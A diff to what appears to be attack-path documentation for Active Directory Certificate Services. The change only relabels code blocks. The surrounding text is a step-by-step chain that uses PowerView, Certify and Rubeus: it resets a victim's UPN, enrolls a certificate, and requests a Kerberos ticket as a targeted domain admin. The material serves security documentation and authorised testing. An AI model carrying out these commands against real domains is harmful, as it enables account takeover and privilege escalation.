@@ -14,7 +14,7 @@ The victim also has enrollment permission for an enterprise CA with the necessar
 
 Step 1: Set UPN of victim to targeted principal's `sAMAccountName`. Set the UPN of the victim principal using PowerView:
 
-```bash
+```PowerShell
 Set-DomainObject -Identity VICTIM -Set @{'userprincipalname'='Target'}
 ```
 Step 2: Check if the 'mail' attribute of victim must be set and set it if required.
@@ -30,14 +30,14 @@ principal why it can be set to any arbitrary string.
 
 Check if the victim has the mail attribute set using PowerView:
 
-```bash
+```PowerShell
 Get-DomainObject -Identity VICTIM -Properties mail
 ```
 If the victim has the mail attribute set, continue to Step 3.
 
 If the victim does not has the mail attribute set, set it to a dummy mail using PowerView:
 
-```bash
+```PowerShell
 Set-DomainObject -Identity VICTIM -Set @{'mail'='dummy@mail.com'}
 ```
 Step 3: Obtain a session as victim. There are several options for this step.
@@ -57,7 +57,7 @@ Step 4: Enroll certificate as victim.
 
 Use Certify (2.0) as the victim principal to request enrollment in the affected template, specifying the affected EnterpriseCA:
 
-```bash
+```cmd
 Certify.exe request --ca SERVER\CA-NAME --template TEMPLATE
 ```
 The certificate PFX is printed to the console in a base64-encoded format.
@@ -66,7 +66,7 @@ Step 5: Set UPN of victim to arbitrary value.
 
 Set the UPN of the victim principal using PowerView:
 
-```bash
+```PowerShell
 Set-DomainObject -Identity VICTIM -Set @{'userprincipalname'='victim@corp.local'}
 ```
 
@@ -74,7 +74,7 @@ Step 6: Perform Kerberos authentication as targeted principal against affected D
 
 Use Rubeus to request a ticket granting ticket (TGT) from the domain, specifying the target identity to impersonate and the base64-encoded PFX obtained in Step 4:
 
-```bash
+```cmd
 Rubeus.exe asktgt /certificate:<cert base64> /user:forestrootda /domain:forestroot.com /ptt
 ```
 
